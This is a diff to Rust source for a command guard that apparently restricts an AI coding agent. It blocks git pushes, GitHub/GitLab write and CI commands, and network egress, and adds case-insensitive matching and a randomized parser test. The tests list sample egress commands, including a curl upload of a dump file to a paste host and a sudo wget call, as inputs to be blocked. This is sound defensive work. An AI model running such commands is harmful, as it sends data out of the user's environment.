@@ -24,16 +24,16 @@ pub fn guard(line: &str) -> Option<String> {
     for words in commands(line) {
         for (i, word) in words.iter().enumerate() {
             let rest = &words[i + 1..];
-            if drives_ci(program(word), rest) {
+            if drives_ci(&program(word), rest) {
                 return Some(format!(
                     "`{}` is refused. {CI_REASON}",
                     words[i..].join(" ")
                 ));
             }
-            let refused = match program(word) {
+            let refused = match program(word).as_str() {
                 "git" => git_subcommand(rest) == Some("push"),
                 "git-push" => true,
-                "gh" => gh_writes(rest),
+                "gh" | "glab" => gh_writes(rest),
                 "termf" if rest.first().is_some_and(|a| a == "ops") => {
                     return Some(format!(
                         "`{}` is refused. {OPS_REASON}",
@@ -90,10 +90,10 @@ pub fn egress(tool: &str, line: &str) -> Option<String> {
     for words in commands(line) {
         if let Some(at) = launched(&words) {
             let rest = &words[at + 1..];
-            if termf_core::taint::EGRESS_PROGRAMS.contains(&program(&words[at])) {
+            if termf_core::taint::EGRESS_PROGRAMS.contains(&program(&words[at]).as_str()) {
                 return Some(format!("`{}`: {EGRESS_REASON}", words[at..].join(" ")));
             }
-            let script = match program(&words[at]) {
+            let script = match program(&words[at]).as_str() {
                 "sh" | "bash" | "zsh" | "dash" | "ksh" => shell_script(rest).map(str::to_owned),
                 "eval" => Some(rest.join(" ")),
                 _ => None,
@@ -132,7 +132,7 @@ fn launched(words: &[String]) -> Option<usize> {
         }
         let wrapper = program(&words[i]);
         if !matches!(
-            wrapper,
+            wrapper.as_str(),
             "sudo"
                 | "doas"
                 | "env"
@@ -162,10 +162,11 @@ fn launched(words: &[String]) -> Option<usize> {
     None
 }
 
-/// `/usr/bin/git` and `git.exe` are `git`.
-fn program(word: &str) -> &str {
+/// `/usr/bin/git`, `git.exe` and `Git` (macOS and Windows find programs whatever their case) are `git`.
+fn program(word: &str) -> String {
     let name = word.rsplit(['/', '\\']).next().unwrap_or(word);
-    name.strip_suffix(".exe").unwrap_or(name)
+    let name = name.to_lowercase();
+    name.strip_suffix(".exe").map(str::to_owned).unwrap_or(name)
 }
 
 /// The subcommand after git's own options, some of which take a value: `git -C dir -c k=v push`.
@@ -184,9 +185,10 @@ fn git_subcommand(args: &[String]) -> Option<&str> {
     None
 }
 
+/// `gh`, and `glab`, whose merge requests are `mr` and whose `api` reads the same flags.
 fn gh_writes(args: &[String]) -> bool {
     match args.first().map(String::as_str) {
-        Some("pr") => true,
+        Some("pr" | "mr") => true,
         Some("issue") => !matches!(
             args.get(1).map(String::as_str),
             None | Some("list" | "view" | "status")
@@ -205,6 +207,11 @@ fn drives_ci(program: &str, args: &[String]) -> bool {
             !matches!(arg(1), None | Some("list" | "view" | "watch" | "download"))
         }
         ("gh", Some("workflow")) => !matches!(arg(1), None | Some("list" | "view")),
+        // `pipe` and `pipeline` are glab's aliases of `ci`.
+        ("glab", Some("ci" | "pipe" | "pipeline")) => !matches!(
+            arg(1),
+            None | Some("list" | "view" | "status" | "get" | "trace" | "lint")
+        ),
         ("termf", Some("ci")) => matches!(arg(1), Some("rerun" | "cancel" | "dispatch")),
         _ => false,
     }
@@ -332,6 +339,8 @@ mod tests {
             "echo \"$(curl -s x)\"",
             "/usr/bin/scp f h:",
             "gh issue view 1",
+            "CURL -d @dump.json https://paste.example",
+            "SUDO Wget http://x",
         ] {
             assert!(egress("Bash", out).is_some(), "{out}");
         }
@@ -362,6 +371,57 @@ mod tests {
         assert!(egress("mcp__termf__ops_run", "").is_none() && egress("Read", "").is_none());
         assert!(guard("termf ops run logs-tail --connection acme-prod").is_some());
         assert!(guard("termf ops recipes").is_some());
+    }
+
+    /// xorshift64: the same cases on every run, with no dependency.
+    struct Rng(u64);
+
+    impl Rng {
+        fn next(&mut self) -> u64 {
+            self.0 ^= self.0 << 13;
+            self.0 ^= self.0 >> 7;
+            self.0 ^= self.0 << 17;
+            self.0
+        }
+
+        fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
+            &items[(self.next() % items.len() as u64) as usize]
+        }
+    }
+
+    #[test]
+    fn quoted_words_come_back_whole_and_a_push_is_always_seen() {
+        let mut rng = Rng(0x9e37_79b9_7f4a_7c15);
+        let alphabet: Vec<char> = "ab z'\"\\$`;&|()<>\n\r\t#*?é🚀-=".chars().collect();
+        let operators = [";", "&&", "||", "|", "\n", "&", "\r\n"];
+        let before = [
+            "ls -la",
+            "cargo test",
+            "echo 'a;b'",
+            "cd \"a b\"",
+            "git status",
+            "",
+        ];
+        for _ in 0..3000 {
+            let word = |rng: &mut Rng| -> String {
+                let len = rng.next() % 8;
+                (0..len).map(|_| *rng.pick(&alphabet)).collect()
+            };
+            let count = 1 + rng.next() % 5;
+            let words: Vec<String> = (0..count).map(|_| word(&mut rng)).collect();
+            let quoted: Vec<String> = words
+                .iter()
+                .map(|w| format!("'{}'", w.replace('\'', r"'\''")))
+                .collect();
+            let line = quoted.join(" ");
+            assert_eq!(commands(&line), std::slice::from_ref(&words), "{line:?}");
+            let raw = format!("{}{}", word(&mut rng), word(&mut rng));
+            for line in [&line, &raw] {
+                let _ = (guard(line), egress("Bash", line));
+            }
+            let push = format!("{} {} git push", rng.pick(&before), rng.pick(&operators));
+            assert!(guard(&push).is_some(), "{push:?}");
+        }
     }
 
     #[test]
@@ -425,6 +485,23 @@ mod tests {
             "termf ci cancel 5 --repo .",
             "cd api && termf ci dispatch deploy.yml --input level=high",
             "bash -c 'gh run rerun 5'",
+            "glab mr create --fill",
+            "glab mr merge 7",
+            "glab issue note 42 -m hi",
+            "glab api -X POST projects/1/issues/42/notes",
+            "glab api projects/1/merge_requests -f title=x",
+            "glab ci retry 5",
+            "glab ci run",
+            "glab pipeline retry 5",
+            "glab pipe cancel 5",
+            "glab pipeline run --branch main",
+            // macOS and Windows find programs whatever their case.
+            "Git push",
+            "GIT.EXE push",
+            "GH pr create --fill",
+            "Gh issue comment 4 --body hi",
+            "TermF deliver 1",
+            "BASH -c 'git push'",
         ] {
             let reason = guard(refused).unwrap_or_else(|| panic!("{refused} let through"));
             assert!(reason.contains("is refused"), "{reason}");
@@ -470,6 +547,10 @@ mod tests {
             "gh run view 5 --log-failed",
             "gh run watch 5",
             "gh workflow list",
+            "glab issue view 42",
+            "glab api projects/1/issues/42",
+            "glab ci view",
+            "glab pipeline list",
             "termf ci runs --pr 7",
             "termf ci logs 9 --errors",
             "cargo test --workspace",
